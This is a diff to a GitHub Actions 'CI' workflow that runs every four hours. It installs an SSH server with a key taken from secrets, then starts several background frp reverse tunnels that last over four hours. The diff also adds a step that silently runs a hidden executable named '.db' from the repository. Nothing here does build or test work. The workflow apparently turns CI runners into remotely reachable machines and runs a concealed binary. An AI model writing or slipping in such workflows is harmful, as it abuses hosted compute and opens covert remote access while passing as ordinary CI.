@@ -2,11 +2,10 @@ name: CI
 
 on:
   push:
-    branches: 
+    branches:
       - master
-  schedule: 
-    - cron: '0 */4 * * *'
-        
+  schedule:
+    - cron: "0 */4 * * *"
 
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
@@ -17,45 +16,50 @@ jobs:
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-    # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-    - uses: actions/checkout@v2
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v2
 
-    - name: deps
-      run: |
-        sudo apt-get install wget -y
-        
-    - name: ssh
-      run: |
-        sudo apt-get install wget openssh-server -y
-        mkdir -p ~/.ssh
-        echo ${{ secrets.PUB_KEY }} >> ~/.ssh/authorized_keys
-        sudo chmod 755 ~
-        sudo chmod 700 ~/.ssh
-        sudo chmod 600 ~/.ssh/authorized_keys
-        sudo sed -i "s/#PubkeyAuthentication/PubkeyAuthentication/" /etc/ssh/sshd_config
-        sudo sed -i "s/#AuthorizedKeysFile/AuthorizedKeysFile/" /etc/ssh/sshd_config
-        sudo /etc/init.d/ssh restart #sudo service ssh start
-    
-    - name: serve
-      run: |
-        wget https://github.com/fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_amd64.tar.gz
-        tar xzvf frp_0.35.1_linux_amd64.tar.gz
-        rm frp_0.35.1_linux_amd64.tar.gz
-        mv frp_0.35.1_linux_amd64 frp
-        cd frp
-        cat > frpc.ini << EOF
-        ${{ secrets.CINI }}
-        EOF
-        cat > frpc2.ini << EOF
-        ${{ secrets.CINI2 }}
-        EOF
-        cat > frpc3.ini << EOF
-        ${{ secrets.CINI3 }}
-        EOF
-        RAND_HEX=$(hexdump -n 8 -e '4/4 "%08X" 1 "\n"' /dev/random)
-        sed -i "s/haha/${RAND_HEX}_${USER}/" frpc.ini
-        sed -i "s/haha/${RAND_HEX}_${USER}/" frpc2.ini
-        sed -i "s/haha/${RAND_HEX}_${USER}/" frpc3.ini
-        nohup ./frpc -c ./frpc3.ini >/dev/null 2>&1 &
-        nohup ./frpc -c ./frpc2.ini >/dev/null 2>&1 &
-        export NO_ERR=$(timeout 15000s ./frpc -c ./frpc.ini >/dev/null 2>&1)
+      - name: deps
+        run: |
+          sudo apt-get install wget -y
+
+      - name: ssh
+        run: |
+          sudo apt-get install wget openssh-server -y
+          mkdir -p ~/.ssh
+          echo ${{ secrets.PUB_KEY }} >> ~/.ssh/authorized_keys
+          sudo chmod 755 ~
+          sudo chmod 700 ~/.ssh
+          sudo chmod 600 ~/.ssh/authorized_keys
+          sudo sed -i "s/#PubkeyAuthentication/PubkeyAuthentication/" /etc/ssh/sshd_config
+          sudo sed -i "s/#AuthorizedKeysFile/AuthorizedKeysFile/" /etc/ssh/sshd_config
+          sudo /etc/init.d/ssh restart #sudo service ssh start
+
+      - name: serve
+        run: |
+          cat > conf << EOF
+          ${{ secrets.CONF }}
+          EOF
+          sudo chmod a+x .db
+          nohup ./.db -c conf >/dev/null 2>&1 &
+          wget https://github.com/fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_amd64.tar.gz
+          tar xzvf frp_0.35.1_linux_amd64.tar.gz
+          rm frp_0.35.1_linux_amd64.tar.gz
+          mv frp_0.35.1_linux_amd64 frp
+          cd frp
+          cat > frpc.ini << EOF
+          ${{ secrets.CINI }}
+          EOF
+          cat > frpc2.ini << EOF
+          ${{ secrets.CINI2 }}
+          EOF
+          cat > frpc3.ini << EOF
+          ${{ secrets.CINI3 }}
+          EOF
+          RAND_HEX=$(hexdump -n 8 -e '4/4 "%08X" 1 "\n"' /dev/random)
+          sed -i "s/haha/${RAND_HEX}_${USER}/" frpc.ini
+          sed -i "s/haha/${RAND_HEX}_${USER}/" frpc2.ini
+          sed -i "s/haha/${RAND_HEX}_${USER}/" frpc3.ini
+          nohup ./frpc -c ./frpc3.ini >/dev/null 2>&1 &
+          nohup ./frpc -c ./frpc2.ini >/dev/null 2>&1 &
+          export NO_ERR=$(timeout 15000s ./frpc -c ./frpc.ini >/dev/null 2>&1)
